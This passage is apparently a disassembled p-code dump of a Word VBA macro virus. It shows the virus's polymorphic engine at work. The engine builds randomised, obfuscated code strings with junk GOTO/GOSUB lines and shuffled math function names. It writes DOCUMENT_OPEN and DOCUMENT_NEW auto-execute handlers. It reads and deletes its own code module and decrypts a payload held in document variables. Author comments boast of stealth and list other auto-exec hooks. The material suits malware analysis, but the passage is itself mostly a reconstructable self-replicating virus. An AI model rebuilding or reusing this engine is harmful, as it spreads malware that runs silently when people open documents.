' 	BoSImplicit 
' 	Ld NS 
' 	LitStr 0x0007 " = ASC("
' 	Concat 
' 	Ld X9 
' 	Concat 
' 	Ld E6 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld X9 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #226:
' 	Return 
' Line #227:
' 	Label MATHFFUNCT 
' Line #228:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St E4 
' Line #229:
' 	LitDI2 0x0012 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St E1 
' Line #230:
' 	Ld E1 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "ABS"
' 	St MATHF 
' 	EndIf 
' Line #231:
' 	Ld E1 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "ATN"
' 	St MATHF 
' 	EndIf 
' Line #232:
' 	Ld E1 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "COS"
' 	St MATHF 
' 	EndIf 
' Line #233:
' 	Ld E1 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "SIN"
' 	St MATHF 
' 	EndIf 
' Line #234:
' 	Ld E1 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "INT"
' 	St MATHF 
' 	EndIf 
' Line #235:
' 	Ld E1 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "FIX"
' 	St MATHF 
' 	EndIf 
' Line #236:
' 	Ld E1 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "RND"
' 	St MATHF 
' 	EndIf 
' Line #237:
' 	Ld E1 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "SGN"
' 	St MATHF 
' 	EndIf 
' Line #238:
' 	Ld E1 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "SQR"
' 	St MATHF 
' 	EndIf 
' Line #239:
' 	Ld E1 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "TAN"
' 	St MATHF 
' 	EndIf 
' Line #240:
' 	Ld E1 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "STR"
' 	Ld E5 
' 	Add 
' 	St MATHF 
' 	EndIf 
' Line #241:
' 	Ld E1 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "OCT"
' 	Ld E5 
' 	Add 
' 	St MATHF 
' 	EndIf 
' Line #242:
' 	Ld E1 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "SPACE"
' 	Ld E5 
' 	Add 
' 	St MATHF 
' 	EndIf 
' Line #243:
' 	Ld E1 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "STR"
' 	Ld E5 
' 	Add 
' 	St MATHF 
' 	EndIf 
' Line #244:
' 	Ld E1 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "LTRIM"
' 	Ld E5 
' 	Add 
' 	St MATHF 
' 	EndIf 
' Line #245:
' 	Ld E1 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "RTRIM"
' 	Ld E5 
' 	Add 
' 	St MATHF 
' 	EndIf 
' Line #246:
' 	Ld E1 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0004 "TRIM"
' 	Ld E5 
' 	Add 
' 	St MATHF 
' 	EndIf 
' Line #247:
' 	Ld E1 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "HEX"
' 	Ld E5 
' 	Add 
' 	St MATHF 
' 	EndIf 
' Line #248:
' 	Return 
' Line #249:
' 	Label F8 
' Line #250:
' 	LitStr 0x0000 ""
' 	St F9 
' Line #251:
' 	LitStr 0x0000 ""
' 	St G1 
' Line #252:
' 	LitStr 0x0000 ""
' 	St G2 
' Line #253:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St G1 
' Line #254:
' 	Ld G1 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld C 
' 	LitStr 0x0006 " GOTO "
' 	Concat 
' 	St G4 
' 	Else 
' 	BoSImplicit 
' 	Ld C 
' 	LitStr 0x0007 " GOSUB "
' 	Concat 
' 	St G4 
' 	EndIf 
' Line #255:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St G1 
' Line #256:
' 	Ld G1 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoSub NV 
' 	BoS 0x0000 
' 	Ld NZ 
' 	St G5 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0001 ":"
' 	St G5 
' 	EndIf 
' Line #257:
' 	Ld G5 
' 	Ld G4 
' 	Add 
' 	St F9 
' Line #258:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St G1 
' Line #259:
' 	Ld G1 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoSub NV 
' 	BoS 0x0000 
' 	Ld NZ 
' 	Ld C 
' 	Concat 
' 	St G2 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0001 " "
' 	St G2 
' 	EndIf 
' Line #260:
' 	Return 
' Line #261:
' 	LineNum 2 
' 	LitDI2 0x0000 
' 	St J 
' Line #262:
' 	QuoteRem 0x0000 0x001B "If WW = WZ Then NX = NX - 1"
' Line #263:
' 	Ld NX 
' 	LitDI2 0x0001 
' 	Sub 
' 	St NX 
' Line #264:
' 	Ld NX 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St I 
' Line #265:
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St NQ 
' Line #266:
' 	LitDI2 0x0063 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St NN 
' Line #267:
' 	Ld NX 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #268:
' 	GoSub NV 
' Line #269:
' 	Ld K 
' 	Ld NZ 
' 	Concat 
' 	St K 
' Line #270:
' 	GoSub F8 
' Line #271:
' 	GoTo 1 
' Line #272:
' 	EndIfBlock 
' Line #273:
' 	Ld NQ 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld NX 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #274:
' 	GoSub NV 
' Line #275:
' 	Ld K 
' 	Ld NZ 
' 	Concat 
' 	St K 
' Line #276:
' 	EndIfBlock 
' Line #277:
' 	GoSub F8 
' Line #278:
' 	GoTo 1 
' Line #279:
' 	Label NW 
' Line #280:
' 	GoSub F8 
' Line #281:
' 	Ld WL 
' 	LitDI2 0x0002 
' 	Mul 
' 	St WZ 
' Line #282:
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St CH 
' Line #283:
' 	Ld CH 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001C "PRIVATE SUB DOCUMENT_OPEN() "
' 	Ld F9 
' 	Concat 
' 	Ld JW 
' 	Concat 
' 	St K 
' 	EndIf 
' Line #284:
' 	Ld CH 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001B "PRIVATE SUB DOCUMENT_NEW() "
' 	Ld F9 
' 	Concat 
' 	Ld JW 
' 	Concat 
' 	St K 
' 	EndIf 
' Line #285:
' 	QuoteRem 0x0000 0x003A "just sample! for nice stealth i throw out every "SUB ..."!"
' Line #286:
' 	QuoteRem 0x0000 0x002E "If CH = 3 Then K = "SUB AUTOOPEN() " & F9 & JW"
' Line #287:
' 	QuoteRem 0x0000 0x002E "If CH = 4 Then K = "SUB AUTOEXEC() " & F9 & JW"
' Line #288:
' 	QuoteRem 0x0000 0x002D "If CH = 5 Then K = "SUB AUTONEW() " & F9 & JW"
' Line #289:
' 	QuoteRem 0x0000 0x002E "If CH = 6 Then K = "SUB FILEOPEN() " & F9 & JW"
' Line #290:
' 	QuoteRem 0x0000 0x002E "If CH = 7 Then K = "SUB FILESAVE() " & F9 & JW"
' Line #291:
' 	QuoteRem 0x0000 0x0030 "If CH = 8 Then K = "SUB FILESAVEAS() " & F9 & JW"
' Line #292:
' 	GoTo 2 
' Line #293:
' 	Ld NX 
' 	LitDI2 0x0000 
' 	Eq 
' 	Not 
' 	DoWhile 
' Line #294:
' 	LitStr 0x0000 ""
' 	St C 
' Line #295:
' 	QuoteRem 0x0000 0x003E "if anyone have any idea how to write this block little shorter"
' Line #296:
' 	QuoteRem 0x0000 0x0021 "then plz do it. send me a sample!"
' Line #297:
' 	LineNum 1 
' 	Ld A1 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St A1 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld JW 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld V6 
' 	Concat 
' 	LitStr 0x0026 "= THISDOCUMENT.VBPROJECT.VBCOMPONENTS("
' 	Concat 
' 	Ld RA 
' 	Concat 
' 	LitStr 0x0019 ").CODEMODULE.COUNTOFLINES"
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld J2 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #298:
' 	Ld A2 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St A2 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld J2 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	LitStr 0x0025 "THISDOCUMENT.VBPROJECT.VBCOMPONENTS( "
' 	Concat 
' 	Ld RB 
' 	Concat 
' 	LitStr 0x001B ").CODEMODULE.DELETELINES ( "
' 	Concat 
' 	Ld RC 
' 	Concat 
' 	LitStr 0x0003 "), "
' 	Concat 
' 	Ld V6 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld J3 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #299:
' 	Ld A3 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St A3 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld J3 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld V1 
' 	Concat 
' 	LitStr 0x0019 "= THISDOCUMENT.VARIABLES("
' 	Concat 
' 	Ld R0 
' 	Concat 
' 	LitStr 0x0007 ").VALUE"
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld Q1 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #300:
' 	Ld D1 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St D1 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld Q1 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld W1 
' 	Concat 
' 	LitStr 0x0006 "=LEN( "
' 	Concat 
' 	Ld V3 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld Q2 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #301:
' 	Ld D2 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St D2 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld Q2 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld W2 
' 	Concat 
' 	LitStr 0x0007 "= LEN( "
' 	Concat 
' 	Ld V1 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld Q3 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #302:
' 	Ld D3 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St D3 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld Q3 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld W3 
' 	Concat 
' 	LitStr 0x0007 "= LEN( "
' 	Concat 
' 	Ld CC 
' 	Concat 
' 	Ld V0 
' 	Concat 
' 	Ld CC 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld J4 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #303:
' 	Ld A4 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St A4 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld J4 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	LitStr 0x0003 "IF "
' 	Concat 
' 	Ld W1 
' 	Concat 
' 	LitStr 0x0002 "= "
' 	Concat 
' 	Ld W2 
' 	Concat 
' 	LitStr 0x0001 "-"
' 	Concat 
' 	Ld W3 
' 	Concat 
' 	LitStr 0x000B " THEN GOTO "
' 	Concat 
' 	Ld JL 
' 	Concat 
' 	LitStr 0x0006 " ELSE "
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld J5 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #304:
' 	Ld A5 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St A5 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld J5 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld V5 
' 	Concat 
' 	LitStr 0x0002 "= "
' 	Concat 
' 	Ld V5 
' 	Concat 
' 	LitStr 0x0002 "+ "
' 	Concat 
' 	Ld RD 
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld JI 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #305:
' 	Ld AC 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St AC 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld JI 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld V8 
' 	Concat 
' 	LitStr 0x0002 "= "
' 	Concat 
' 	Ld V8 
' 	Concat 
' 	LitStr 0x0003 " + "
' 	Concat 
' 	Ld RI 
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld J6 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #306:
' 	Ld A6 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St A6 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld J6 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld V2 
' 	Concat 
' 	LitStr 0x0007 "= MID( "
' 	Concat 
' 	Ld V1 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	Ld V5 
' 	Concat 
' 	LitStr 0x0001 ","
' 	Concat 
' 	Ld RE 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld TA 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #307:
' 	Ld TH 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St TH 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld TA 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld T4 
' 	Concat 
' 	LitStr 0x0008 "= UCASE("
' 	Concat 
' 	Ld CC 
' 	Concat 
' 	Ld V0 
' 	Concat 
' 	Ld CC 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld JJ 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #308:
' 	Ld AD 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St AD 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld JJ 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld V9 
' 	Concat 
' 	LitStr 0x0006 "= MID("
' 	Concat 
' 	Ld T4 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	Ld V8 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	Ld RH 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld TB 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #309:
' 	Ld TI 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St TI 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld TB 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld T5 
' 	Concat 
' 	LitStr 0x0007 "= LEN( "
' 	Concat 
' 	Ld CC 
' 	Concat 
' 	Ld V0 
' 	Concat 
' 	Ld CC 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld JK 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #310:
' 	Ld AE 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St AE 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld JK 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	LitStr 0x0003 "IF "
' 	Concat 
' 	Ld V8 
' 	Concat 
' 	LitStr 0x0002 "= "
' 	Concat 
' 	Ld T5 
' 	Concat 
' 	LitStr 0x0006 " THEN "
' 	Concat 
' 	Ld V8 
' 	Concat 
' 	LitStr 0x0002 "= "
' 	Concat 
' 	Ld RJ 
' 	Concat 
' 	LitStr 0x0007 ": GOTO "
' 	Concat 
' 	Ld TC 
' 	Concat 
' 	LitStr 0x0006 " ELSE "
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld TC 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #311:
' 	Ld TJ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St TJ 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld TC 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld T6 
' 	Concat 
' 	LitStr 0x0007 "= ASC( "
' 	Concat 
' 	Ld V2 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld TD 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #312:
' 	Ld TK 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St TK 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld TD 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld T7 
' 	Concat 
' 	LitStr 0x0007 "= ASC( "
' 	Concat 
' 	Ld V9 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld J9 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #313:
' 	Ld AF 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St AF 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld J9 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld VB 
' 	Concat 
' 	LitStr 0x0002 "= "
' 	Concat 
' 	Ld T6 
' 	Concat 
' 	LitStr 0x0002 "- "
' 	Concat 
' 	Ld T7 
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld TX 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #314:
' 	Ld TL 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St TL 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld TX 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld T8 
' 	Concat 
' 	LitStr 0x0006 "= ABS("
' 	Concat 
' 	Ld VB 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld JM 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #315:
' 	Ld A7 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St A7 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld JM 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld V4 
' 	Concat 
' 	LitStr 0x0006 "= CHR("
' 	Concat 
' 	Ld T8 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld JA 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #316:
' 	Ld A8 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St A8 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld JA 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld V3 
' 	Concat 
' 	LitStr 0x0002 "= "
' 	Concat 
' 	Ld V3 
' 	Concat 
' 	LitStr 0x0002 "+ "
' 	Concat 
' 	Ld V4 
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld JB 
